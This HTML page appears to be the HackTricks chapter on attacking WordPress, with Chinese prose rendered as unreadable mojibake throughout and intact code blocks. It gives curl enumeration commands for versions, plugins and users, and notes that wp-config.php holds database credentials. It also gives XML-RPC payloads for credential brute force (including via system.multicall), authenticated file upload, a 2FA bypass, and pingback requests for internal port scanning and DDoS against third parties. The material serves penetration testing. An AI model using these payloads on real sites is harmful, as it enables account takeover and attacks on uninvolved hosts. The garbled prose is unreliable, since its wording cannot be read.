<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Wordpress</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="wordpress"><a class="header" href="#wordpress">Wordpress</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=wordpress"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ç«‹å³è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=wordpress" %}</p>
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯</a></h2>
<ul>
<li>
<p><strong>ä¸Šä¼ çš„</strong> æ–‡ä»¶ä½äº: <code>http://10.10.10.10/wp-content/uploads/2018/08/a.txt</code></p>
</li>
<li>
<p><strong>ä¸»é¢˜æ–‡ä»¶å¯ä»¥åœ¨ /wp-content/themes/ ä¸­æ‰¾åˆ°ï¼Œ</strong> æ‰€ä»¥å¦‚æœä½ æ›´æ”¹ä¸»é¢˜çš„ä¸€äº› php æ–‡ä»¶ä»¥è·å– RCEï¼Œä½ å¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ <strong>theme twentytwelve</strong> ä½ å¯ä»¥ <strong>è®¿é—®</strong> <strong>404.php</strong> æ–‡ä»¶åœ¨: <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php"><strong>/wp-content/themes/twentytwelve/404.php</strong></a></p>
</li>
<li>
<p><strong>å¦ä¸€ä¸ªæœ‰ç”¨çš„ URL å¯èƒ½æ˜¯:</strong> <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php"><strong>/wp-content/themes/default/404.php</strong></a></p>
</li>
<li>
<p>åœ¨ <strong>wp-config.php</strong> ä¸­å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚</p>
</li>
<li>
<p>é»˜è®¤ç™»å½•è·¯å¾„æ£€æŸ¥: <em><strong>/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/</strong></em></p>
</li>
</ul>
<h3 id="ä¸»è¦-wordpress-æ–‡ä»¶"><a class="header" href="#ä¸»è¦-wordpress-æ–‡ä»¶"><strong>ä¸»è¦ WordPress æ–‡ä»¶</strong></a></h3>
<ul>
<li><code>index.php</code></li>
<li><code>license.txt</code> åŒ…å«æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚</li>
<li><code>wp-activate.php</code> ç”¨äºåœ¨è®¾ç½®æ–° WordPress ç½‘ç«™æ—¶çš„ç”µå­é‚®ä»¶æ¿€æ´»è¿‡ç¨‹ã€‚</li>
<li>ç™»å½•æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰ï¼š</li>
<li><code>/wp-admin/login.php</code></li>
<li><code>/wp-admin/wp-login.php</code></li>
<li><code>/login.php</code></li>
<li><code>/wp-login.php</code></li>
<li><code>xmlrpc.php</code> æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä»£è¡¨ WordPress çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸æ•°æ®é€šè¿‡ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶ï¼ŒXML ä½œä¸ºç¼–ç æœºåˆ¶è¿›è¡Œä¼ è¾“ã€‚è¿™ç§ç±»å‹çš„é€šä¿¡å·²è¢« WordPress <a href="https://developer.wordpress.org/rest-api/reference">REST API</a> æ›¿ä»£ã€‚</li>
<li><code>wp-content</code> æ–‡ä»¶å¤¹æ˜¯å­˜å‚¨æ’ä»¶å’Œä¸»é¢˜çš„ä¸»è¦ç›®å½•ã€‚</li>
<li><code>wp-content/uploads/</code> æ˜¯å­˜å‚¨ä¸Šä¼ åˆ°å¹³å°çš„ä»»ä½•æ–‡ä»¶çš„ç›®å½•ã€‚</li>
<li><code>wp-includes/</code> è¿™æ˜¯å­˜å‚¨æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œå°éƒ¨ä»¶ã€‚</li>
<li><code>wp-sitemap.xml</code> åœ¨ WordPress ç‰ˆæœ¬ 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWordPress ç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å…¬å…±å¸–å­å’Œå¯å…¬å¼€æŸ¥è¯¢çš„å¸–å­ç±»å‹å’Œåˆ†ç±»æ³•çš„ sitemap XML æ–‡ä»¶ã€‚</li>
</ul>
<p><strong>åæœŸåˆ©ç”¨</strong></p>
<ul>
<li><code>wp-config.php</code> æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åç§°ã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€èº«ä»½éªŒè¯å¯†é’¥å’Œç›ï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚æ­¤é…ç½®æ–‡ä»¶è¿˜å¯ä»¥ç”¨äºæ¿€æ´» DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤æ—¶å¯èƒ½å¾ˆæœ‰ç”¨ã€‚</li>
</ul>
<h3 id="ç”¨æˆ·æƒé™"><a class="header" href="#ç”¨æˆ·æƒé™">ç”¨æˆ·æƒé™</a></h3>
<ul>
<li><strong>ç®¡ç†å‘˜</strong></li>
<li><strong>ç¼–è¾‘</strong>: å‘å¸ƒå’Œç®¡ç†ä»–å’Œå…¶ä»–äººçš„å¸–å­</li>
<li><strong>ä½œè€…</strong>: å‘å¸ƒå’Œç®¡ç†è‡ªå·±çš„å¸–å­</li>
<li><strong>è´¡çŒ®è€…</strong>: æ’°å†™å’Œç®¡ç†è‡ªå·±çš„å¸–å­ä½†ä¸èƒ½å‘å¸ƒ</li>
<li><strong>è®¢é˜…è€…</strong>: æµè§ˆå¸–å­å¹¶ç¼–è¾‘ä»–ä»¬çš„ä¸ªäººèµ„æ–™</li>
</ul>
<h2 id="è¢«åŠ¨æšä¸¾"><a class="header" href="#è¢«åŠ¨æšä¸¾"><strong>è¢«åŠ¨æšä¸¾</strong></a></h2>
<h3 id="è·å–-wordpress-ç‰ˆæœ¬"><a class="header" href="#è·å–-wordpress-ç‰ˆæœ¬"><strong>è·å– WordPress ç‰ˆæœ¬</strong></a></h3>
<p>æ£€æŸ¥æ˜¯å¦å¯ä»¥æ‰¾åˆ°æ–‡ä»¶ <code>/license.txt</code> æˆ– <code>/readme.html</code></p>
<p>åœ¨é¡µé¢çš„ <strong>æºä»£ç </strong> ä¸­ï¼ˆæ¥è‡ª <a href="https://wordpress.org/support/article/pages/">https://wordpress.org/support/article/pages/</a> çš„ç¤ºä¾‹ï¼‰:</p>
<ul>
<li>grep</li>
</ul>
<pre><code class="language-bash">curl https://victim.com/ | grep 'content="WordPress'
</code></pre>
<ul>
<li><code>meta name</code></li>
</ul>
<p><img src="../../.gitbook/assets/image%20(1111).png" alt="" /></p>
<ul>
<li>CSSé“¾æ¥æ–‡ä»¶</li>
</ul>
<p><img src="../../.gitbook/assets/image%20(533).png" alt="" /></p>
<ul>
<li>JavaScriptæ–‡ä»¶</li>
</ul>
<p><img src="../../.gitbook/assets/image%20(524).png" alt="" /></p>
<h3 id="è·å–æ’ä»¶"><a class="header" href="#è·å–æ’ä»¶">è·å–æ’ä»¶</a></h3>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
</code></pre>
<h3 id="è·å–ä¸»é¢˜"><a class="header" href="#è·å–ä¸»é¢˜">è·å–ä¸»é¢˜</a></h3>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
</code></pre>
<h3 id="æå–ç‰ˆæœ¬ä¿¡æ¯"><a class="header" href="#æå–ç‰ˆæœ¬ä¿¡æ¯">æå–ç‰ˆæœ¬ä¿¡æ¯</a></h3>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

</code></pre>
<p>{% endcode %}</p>
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=wordpress"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ç«‹å³è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=wordpress" %}</p>
<h2 id="ä¸»åŠ¨æšä¸¾"><a class="header" href="#ä¸»åŠ¨æšä¸¾">ä¸»åŠ¨æšä¸¾</a></h2>
<h3 id="æ’ä»¶å’Œä¸»é¢˜"><a class="header" href="#æ’ä»¶å’Œä¸»é¢˜">æ’ä»¶å’Œä¸»é¢˜</a></h3>
<p>æ‚¨å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°æ‰€æœ‰è¿™äº›ï¼Œæ‚¨éœ€è¦ <strong>ä¸»åŠ¨æš´åŠ›ç ´è§£æ’ä»¶å’Œä¸»é¢˜çš„åˆ—è¡¨</strong>ï¼ˆå¸Œæœ›å¯¹æˆ‘ä»¬æ¥è¯´ï¼Œæœ‰è‡ªåŠ¨åŒ–å·¥å…·åŒ…å«è¿™äº›åˆ—è¡¨ï¼‰ã€‚</p>
<h3 id="ç”¨æˆ·"><a class="header" href="#ç”¨æˆ·">ç”¨æˆ·</a></h3>
<ul>
<li><strong>ID æš´åŠ›ç ´è§£ï¼š</strong> é€šè¿‡æš´åŠ›ç ´è§£ç”¨æˆ· ID ä» WordPress ç½‘ç«™è·å–æœ‰æ•ˆç”¨æˆ·ï¼š</li>
</ul>
<pre><code class="language-bash">curl -s -I -X GET http://blog.example.com/?author=1
</code></pre>
<p>å¦‚æœå“åº”æ˜¯ <strong>200</strong> æˆ– <strong>30X</strong>ï¼Œè¿™æ„å‘³ç€ id æ˜¯ <strong>æœ‰æ•ˆ</strong> çš„ã€‚å¦‚æœå“åº”æ˜¯ <strong>400</strong>ï¼Œé‚£ä¹ˆ id æ˜¯ <strong>æ— æ•ˆ</strong> çš„ã€‚</p>
<ul>
<li><strong>wp-json:</strong> ä½ ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢æ¥è·å–ç”¨æˆ·çš„ä¿¡æ¯ï¼š</li>
</ul>
<pre><code class="language-bash">curl http://blog.example.com/wp-json/wp/v2/users
</code></pre>
<p>å¦ä¸€ä¸ªå¯ä»¥æ­ç¤ºç”¨æˆ·ä¿¡æ¯çš„ <code>/wp-json/</code> ç«¯ç‚¹æ˜¯ï¼š</p>
<pre><code class="language-bash">curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
</code></pre>
<p>æ³¨æ„ï¼Œæ­¤ç«¯ç‚¹ä»…æš´éœ²å·²å‘å¸ƒå¸–å­çš„ç”¨æˆ·ã€‚<strong>ä»…æä¾›å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯</strong>ã€‚</p>
<p>è¿˜è¦æ³¨æ„ï¼Œ<strong>/wp-json/wp/v2/pages</strong> å¯èƒ½ä¼šæ³„éœ² IP åœ°å€ã€‚</p>
<ul>
<li><strong>ç™»å½•ç”¨æˆ·åæšä¸¾</strong>ï¼šåœ¨ <strong><code>/wp-login.php</code></strong> ç™»å½•æ—¶ï¼Œ<strong>æ¶ˆæ¯</strong>åœ¨æŒ‡ç¤ºçš„ <strong>ç”¨æˆ·åæ˜¯å¦å­˜åœ¨</strong> æ—¶æ˜¯ <strong>ä¸åŒçš„</strong>ã€‚</li>
</ul>
<h3 id="xml-rpc"><a class="header" href="#xml-rpc">XML-RPC</a></h3>
<p>å¦‚æœ <code>xml-rpc.php</code> å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œå‡­æ®æš´åŠ›ç ´è§£æˆ–åˆ©ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS æ”»å‡»ã€‚ï¼ˆæ‚¨å¯ä»¥é€šè¿‡<a href="https://github.com/relarizky/wpxploit">ä½¿ç”¨è¿™ä¸ª</a>æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ï¼Œä¾‹å¦‚ï¼‰ã€‚</p>
<p>è¦æŸ¥çœ‹å®ƒæ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œè¯·å°è¯•è®¿é—® <em><strong>/xmlrpc.php</strong></em> å¹¶å‘é€æ­¤è¯·æ±‚ï¼š</p>
<p><strong>æ£€æŸ¥</strong></p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;system.listMethods&lt;/methodName&gt;
&lt;params&gt;&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p><img src="https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656" alt="" /></p>
<p><strong>å‡­è¯æš´åŠ›ç ´è§£</strong></p>
<p><strong><code>wp.getUserBlogs</code></strong>ã€<strong><code>wp.getCategories</code></strong> æˆ– <strong><code>metaWeblog.getUsersBlogs</code></strong> æ˜¯ä¸€äº›å¯ä»¥ç”¨æ¥æš´åŠ›ç ´è§£å‡­è¯çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼äºï¼š</p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;pass&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p>æ¶ˆæ¯ <em>"ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"</em> åº”è¯¥å‡ºç°åœ¨ 200 ä»£ç å“åº”ä¸­ï¼Œå¦‚æœå‡­æ®æ— æ•ˆã€‚</p>
<p><img src="../../.gitbook/assets/image%20(107)%20(2)%20(2)%20(2)%20(2)%20(2)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(2)%20(4)%20(1).png" alt="" /></p>
<p><img src="../../.gitbook/assets/image%20(721).png" alt="" /></p>
<p>ä½¿ç”¨æ­£ç¡®çš„å‡­æ®ï¼Œæ‚¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ï¼Œè·¯å¾„å°†å‡ºç° (<a href="https://gist.github.com/georgestephanis/5681982">https://gist.github.com/georgestephanis/5681982</a>)</p>
<pre><code class="language-markup">&lt;?xml version='1.0' encoding='utf-8'?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;
&lt;struct&gt;
&lt;member&gt;
&lt;name&gt;name&lt;/name&gt;
&lt;value&gt;&lt;string&gt;filename.jpg&lt;/string&gt;&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;type&lt;/name&gt;
&lt;value&gt;&lt;string&gt;mime/type&lt;/string&gt;&lt;/value&gt;
&lt;/member&gt;
&lt;member&gt;
&lt;name&gt;bits&lt;/name&gt;
&lt;value&gt;&lt;base64&gt;&lt;![CDATA[---base64-encoded-data---]]&gt;&lt;/base64&gt;&lt;/value&gt;
&lt;/member&gt;
&lt;/struct&gt;
&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p>è¿˜æœ‰ä¸€ç§<strong>æ›´å¿«çš„æ–¹æ³•</strong>å¯ä»¥ä½¿ç”¨**<code>system.multicall</code>**è¿›è¡Œæš´åŠ›ç ´è§£å‡­æ®ï¼Œå› ä¸ºæ‚¨å¯ä»¥åœ¨åŒä¸€è¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­æ®ï¼š</p>
<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>
<p><strong>ç»•è¿‡ 2FA</strong></p>
<p>æ­¤æ–¹æ³•æ˜¯é’ˆå¯¹ç¨‹åºè€Œéäººç±»çš„ï¼Œå¹¶ä¸”è¾ƒæ—§ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æœ‰æ•ˆçš„å‡­æ®ï¼Œä½†ä¸»è¦å…¥å£å—åˆ° 2FA ä¿æŠ¤ï¼Œ<strong>æ‚¨å¯èƒ½èƒ½å¤Ÿåˆ©ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº›å‡­æ®ç™»å½•ï¼Œä»è€Œç»•è¿‡ 2FA</strong>ã€‚è¯·æ³¨æ„ï¼Œæ‚¨å°†æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°å¯ä»¥æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œï¼Œä½†æ‚¨ä»ç„¶å¯èƒ½èƒ½å¤Ÿè¾¾åˆ° RCEï¼Œæ­£å¦‚ Ippsec åœ¨ <a href="https://www.youtube.com/watch?v=p8mIdm93mfw&amp;t=1130s">https://www.youtube.com/watch?v=p8mIdm93mfw&amp;t=1130s</a> ä¸­è§£é‡Šçš„é‚£æ ·ã€‚</p>
<p><strong>DDoS æˆ–ç«¯å£æ‰«æ</strong></p>
<p>å¦‚æœæ‚¨å¯ä»¥åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°æ–¹æ³• <em><strong>pingback.ping</strong></em>ï¼Œåˆ™å¯ä»¥ä½¿ Wordpress å‘ä»»ä½•ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚<br />
è¿™å¯ä»¥ç”¨æ¥è¯·æ±‚<strong>æˆåƒä¸Šä¸‡</strong>çš„ Wordpress <strong>ç«™ç‚¹</strong>å»<strong>è®¿é—®</strong>ä¸€ä¸ª<strong>ä½ç½®</strong>ï¼ˆå› æ­¤åœ¨è¯¥ä½ç½®é€ æˆ<strong>DDoS</strong>ï¼‰æˆ–è€…æ‚¨å¯ä»¥ç”¨å®ƒè®©<strong>Wordpress</strong>å»<strong>æ‰«æ</strong>ä¸€äº›å†…éƒ¨<strong>ç½‘ç»œ</strong>ï¼ˆæ‚¨å¯ä»¥æŒ‡å®šä»»ä½•ç«¯å£ï¼‰ã€‚</p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;&lt;param&gt;
&lt;value&gt;&lt;string&gt;http://&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;/string&gt;
&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p><img src="../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png" alt="" /></p>
<p>å¦‚æœä½ å¾—åˆ°çš„ <strong>faultCode</strong> å€¼ <strong>å¤§äº</strong> <strong>0</strong> (17)ï¼Œè¿™æ„å‘³ç€ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚</p>
<p>æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ <strong><code>system.multicall</code></strong> çš„ä½¿ç”¨ï¼Œäº†è§£å¦‚ä½•åˆ©ç”¨æ­¤æ–¹æ³•é€ æˆ DDoSã€‚</p>
<p><strong>DDoS</strong></p>
<pre><code class="language-markup">&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;http://target/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;http://yoursite.com/and_some_valid_blog_post_url&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<p><img src="../../.gitbook/assets/image%20(110).png" alt="" /></p>
<h3 id="wp-cronphp-dos"><a class="header" href="#wp-cronphp-dos">wp-cron.php DoS</a></h3>
